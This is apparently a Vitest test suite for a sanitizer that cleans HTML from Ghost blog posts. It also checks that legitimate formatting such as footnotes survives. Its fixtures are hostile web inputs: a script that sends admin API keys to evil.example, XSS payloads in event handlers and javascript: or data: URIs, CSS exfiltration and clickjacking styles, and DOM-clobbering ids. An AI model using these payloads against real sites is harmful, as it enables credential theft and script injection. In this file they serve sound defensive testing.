import { readFileSync } from "node:fs";
import { fileURLToPath } from "node:url";
import { describe, expect, it } from "vitest";
import { sanitizePostHtml } from "@/lib/sanitize-post-html";

describe("sanitizePostHtml — payloads hostis vindos do Ghost", () => {
  it("remove <script> e o texto dentro dele", () => {
    const out = sanitizePostHtml(
      `<p>oi</p><script>fetch('/admin/api-keys').then(r=>r.text()).then(t=>fetch('https://evil.example?d='+t))</script>`,
    );
    expect(out).toContain("<p>oi</p>");
    expect(out).not.toContain("<script");
    expect(out).not.toContain("evil.example");
  });

  it.each([
    `<img src=x onerror="alert(document.domain)">`,
    `<p onmouseover="alert(1)">texto</p>`,
    `<div onload=alert(1)>x</div>`,
    `<body onpageshow="alert(1)">x</body>`,
  ])("remove handler inline em %s", (html) => {
    const out = sanitizePostHtml(html);
    expect(out).not.toMatch(/on[a-z]+\s*=/i);
    expect(out).not.toContain("alert(");
  });

  it.each([
    `<a href="javascript:alert(1)">clique</a>`,
    `<a href="JaVaScRiPt:alert(1)">clique</a>`,
    `<a href="data:text/html,<script>alert(1)</script>">clique</a>`,
    `<a href="vbscript:msgbox(1)">clique</a>`,
    `<a href="//evil.example/pwn">clique</a>`,
  ])("descarta href com esquema hostil em %s", (html) => {
    const out = sanitizePostHtml(html);
    expect(out).not.toMatch(/javascript:/i);
    expect(out).not.toMatch(/vbscript:/i);
    expect(out).not.toMatch(/data:text\/html/i);
    expect(out).not.toContain("evil.example");
    // o texto do link sobrevive; so o href hostil cai
    expect(out).toContain("clique");
  });

  it.each([
    `<img src="javascript:alert(1)" alt="x">`,
    `<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+" alt="x">`,
    `<img srcset="javascript:alert(1) 1x" alt="x">`,
  ])("descarta src/srcset hostil em %s", (html) => {
    const out = sanitizePostHtml(html);
    expect(out).not.toMatch(/javascript:/i);
    expect(out).not.toMatch(/data:image\/svg/i);
  });

  it.each([
    `<iframe src="https://evil.example/frame"></iframe>`,
    `<object data="https://evil.example/x"></object>`,
    `<embed src="https://evil.example/x">`,
    `<form action="https://evil.example"><input name="a"><button>go</button></form>`,
    `<svg><animate onbegin="alert(1)" attributeName="x"></animate></svg>`,
    `<math><mtext><style>*{}</style></mtext></math>`,
    `<base href="https://evil.example/">`,
    `<meta http-equiv="refresh" content="0;url=https://evil.example">`,
    `<link rel="stylesheet" href="https://evil.example/x.css">`,
  ])("descarta tag perigosa em %s", (html) => {
    const out = sanitizePostHtml(html);
    expect(out).not.toMatch(/<(iframe|object|embed|form|input|svg|style|base|meta|link|animate)\b/i);
    expect(out).not.toContain("evil.example");
  });

  it("nao deixa CSS de <style> vazar como texto visivel", () => {
    const out = sanitizePostHtml(`<style>body{background:url(https://evil.example/log)}</style><p>ok</p>`);
    expect(out).toBe("<p>ok</p>");
  });

  it("remove style inline (exfiltracao por CSS / overlay de clickjacking)", () => {
    const out = sanitizePostHtml(
      `<p style="position:fixed;inset:0;background:url(https://evil.example/x)">x</p>`,
    );
    expect(out).toBe("<p>x</p>");
  });

  it("aceita entrada vazia ou nula", () => {
    expect(sanitizePostHtml("")).toBe("");
    expect(sanitizePostHtml(null)).toBe("");
    expect(sanitizePostHtml(undefined)).toBe("");
  });
});

describe("sanitizePostHtml — o que um post legitimo precisa", () => {
  it("preserva titulos, paragrafo, enfase e ancora de titulo", () => {
    const out = sanitizePostHtml(
      `<h2 id="secao">Titulo</h2><h3>Sub</h3><p><strong>a</strong> <em>b</em> <code>c</code></p>`,
    );
    expect(out).toContain(`<h2 id="secao">Titulo</h2>`);
    expect(out).toContain("<h3>Sub</h3>");
    expect(out).toContain("<strong>a</strong>");
    expect(out).toContain("<em>b</em>");
    expect(out).toContain("<code>c</code>");
  });

  it("preserva bloco de codigo com a classe de linguagem", () => {
    const out = sanitizePostHtml(
      `<pre><code class="language-ts">const a: number = 1;</code></pre>`,
    );
    expect(out).toContain(`<pre><code class="language-ts">const a: number = 1;</code></pre>`);
  });

  it("preserva citacao, listas e tabela", () => {
    const out = sanitizePostHtml(
      `<blockquote cite="https://example.com"><p>q</p></blockquote>` +
        `<ul><li>a</li></ul><ol><li>b</li></ol>` +
        `<table><thead><tr><th scope="col">h</th></tr></thead><tbody><tr><td colspan="2">d</td></tr></tbody></table>`,
    );
    expect(out).toContain(`<blockquote cite="https://example.com">`);
    expect(out).toContain("<li>a</li>");
    expect(out).toContain("<ol><li>b</li></ol>");
    expect(out).toContain(`<th scope="col">h</th>`);
    expect(out).toContain(`<td colspan="2">d</td>`);
  });

  it("preserva figura, legenda e imagem do Ghost com as classes kg-*", () => {
    const out = sanitizePostHtml(
      `<figure class="kg-card kg-image-card"><img src="https://cdn.example/a.png" alt="a" width="800" height="600" srcset="https://cdn.example/a.png 800w" sizes="(min-width: 720px) 720px"><figcaption>cap</figcaption></figure>`,
    );
    expect(out).toContain(`class="kg-card kg-image-card"`);
    expect(out).toContain(`src="https://cdn.example/a.png"`);
    expect(out).toContain(`alt="a"`);
    expect(out).toContain("<figcaption>cap</figcaption>");
    expect(out).toContain("srcset=");
  });

  it("link externo sai com rel de seguranca e target", () => {
    const out = sanitizePostHtml(`<a href="https://example.com/post">leia</a>`);
    expect(out).toContain(`href="https://example.com/post"`);
    expect(out).toContain(`rel="noopener noreferrer nofollow"`);
    expect(out).toContain(`target="_blank"`);
  });

  it("link interno e mailto continuam sem target", () => {
    const out = sanitizePostHtml(
      `<a href="/pt-BR/blog/outro">interno</a><a href="#nota">nota</a><a href="mailto:a@b.com">mail</a>`,
    );
    expect(out).toContain(`<a href="/pt-BR/blog/outro">interno</a>`);
    expect(out).toContain(`<a href="#nota">nota</a>`);
    expect(out).toContain(`<a href="mailto:a@b.com">mail</a>`);
    expect(out).not.toContain("target=");
  });
});

describe("a pagina do post nao entrega HTML cru ao React", () => {
  // Contrato de UM arquivo, entao vive aqui e nao num script do lint: se
  // alguem voltar a passar `post.html` direto para `dangerouslySetInnerHTML`,
  // este teste cai antes do deploy.
  const page = readFileSync(
    fileURLToPath(new URL("../app/[lang]/(pages)/blog/[slug]/page.tsx", import.meta.url)),
    "utf8",
  );

  it("chama sanitizePostHtml no dangerouslySetInnerHTML", () => {
    expect(page).toContain("sanitizePostHtml(post.html)");
    expect(page).not.toMatch(/__html:\s*post\.html\b/);
  });
});

describe("sanitizePostHtml — nota de rodape do Ghost", () => {
  /**
   * Saida REAL do `markdown-it-footnote` v4 (o plugin que o card de markdown
   * do Ghost usa, via `@tryghost/kg-markdown-html-renderer`), copiada das
   * fixtures do plugin. E o par de ancoras inteiro: `sup`+`a` na referencia,
   * `li` na nota, `a.footnote-backref` na volta.
   */
  const GHOST_FOOTNOTE_POST =
    `<p>Uma afirmacao que precisa de fonte.<sup class="footnote-ref">` +
    `<a href="#fn1" id="fnref1">[1]</a></sup></p>\n` +
    `<hr class="footnotes-sep">\n` +
    `<section class="footnotes">\n<ol class="footnotes-list">\n` +
    `<li id="fn1" class="footnote-item"><p>A fonte. ` +
    `<a href="#fnref1" class="footnote-backref">↩︎</a></p>\n</li>\n` +
    `</ol>\n</section>`;

  it("preserva as duas pontas da ancora de um post real", () => {
    const out = sanitizePostHtml(GHOST_FOOTNOTE_POST);

    // ida: a referencia aponta para a nota e carrega o proprio `id` de volta
    expect(out).toContain(`<a href="#fn1" id="fnref1">[1]</a>`);
    expect(out).toContain(`<sup class="footnote-ref">`);
    // volta: a nota tem o `id` que o `#fn1` procura, e o backref existe
    expect(out).toContain(`<li id="fn1" class="footnote-item">`);
    expect(out).toContain(`<a href="#fnref1" class="footnote-backref">`);
    // o bloco de notas nao vira um monte de texto solto
    expect(out).toContain(`<section class="footnotes">`);
    expect(out).toContain(`<ol class="footnotes-list">`);
    expect(out).toContain(`class="footnotes-sep"`);
  });

  it("preserva o `:<n>` de nota citada mais de uma vez", () => {
    const out = sanitizePostHtml(
      `<p><sup class="footnote-ref"><a href="#fn1" id="fnref1">[1]</a></sup> ` +
        `<sup class="footnote-ref"><a href="#fn1" id="fnref1:1">[1:1]</a></sup></p>` +
        `<section class="footnotes"><ol class="footnotes-list">` +
        `<li id="fn1" class="footnote-item"><p>foo ` +
        `<a href="#fnref1" class="footnote-backref">a</a> ` +
        `<a href="#fnref1:1" class="footnote-backref">b</a></p></li>` +
        `</ol></section>`,
    );
    expect(out).toContain(`id="fnref1:1"`);
    expect(out).toContain(`href="#fnref1:1"`);
  });

  it.each([
    // DOM clobbering: cada um destes vira `window.<nome>` se o `id` passar
    [`<li id="__proto__">x</li>`, "__proto__"],
    [`<a id="length">x</a>`, "length"],
    [`<section id="config">x</section>`, "config"],
    [`<sup id="body">x</sup>`, "body"],
    // vizinhos do formato legitimo, que nao sao o formato legitimo
    [`<li id="fn1-extra">x</li>`, "fn1-extra"],
    [`<li id="xfn1">x</li>`, "xfn1"],
    [`<li id="FN1">x</li>`, "FN1"],
    [`<li id="fnref">x</li>`, "fnref"],
  ])("descarta id hostil em %s", (html, hostile) => {
    const out = sanitizePostHtml(html);
    expect(out).not.toContain("id=");
    expect(out).not.toContain(hostile);
    // a tag em si continua: o post nao perde conteudo, so o nome global
    expect(out).toContain(">x<");
  });

  it("nao deixa o post escolher o id de um elemento fora do par de notas", () => {
    const out = sanitizePostHtml(
      `<p id="fn1">x</p><div id="fn1">y</div><span id="fn1">z</span><img src="https://cdn.example/a.png" id="fn1" alt="a">`,
    );
    expect(out).not.toContain("id=");
  });
});
